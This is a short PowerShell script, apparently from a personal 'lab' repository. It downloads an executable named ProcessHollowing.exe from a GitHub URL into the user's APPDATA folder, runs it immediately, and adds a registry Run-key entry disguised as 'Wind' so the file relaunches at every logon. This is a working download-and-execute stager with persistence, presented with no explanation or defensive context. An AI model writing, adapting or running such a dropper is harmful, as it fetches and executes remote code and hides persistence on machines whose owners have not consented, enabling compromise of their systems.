$URL = "https://github.com/bibi341min/lab/blob/main/ProcessHollowing.exe";
$Path = $env:APPDATA + "\ProcessHollowing.exe" ; 
Invoke-WebRequest -URI $URL -OutFile $Path; 
Start-Process -FilePath $Path; $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; 
$regName = "Wind"; 
$regValue = $Path; 
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue;
